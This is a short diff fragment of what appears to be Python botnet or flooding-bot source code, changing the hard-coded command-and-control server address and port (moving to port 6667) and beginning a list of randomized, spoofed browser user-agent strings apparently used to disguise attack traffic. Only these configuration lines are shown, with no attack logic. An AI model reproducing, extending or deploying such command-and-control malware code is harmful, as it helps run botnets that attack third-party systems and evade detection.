@@ -3,8 +3,8 @@ import threading
 import time
 import random
 
-C2_ADDRESS  = "194.87.216.95"
-C2_PORT     = 6969
+C2_ADDRESS  = "205.185.120.223"
+C2_PORT     = 6667
 
 base_user_agents = [
     'Mozilla/%.1f (Windows; U; Windows NT {0}; en-US; rv:%.1f.%.1f) Gecko/%d0%d Firefox/%.1f.%.1f'.format(random.uniform(5.0, 10.0)),
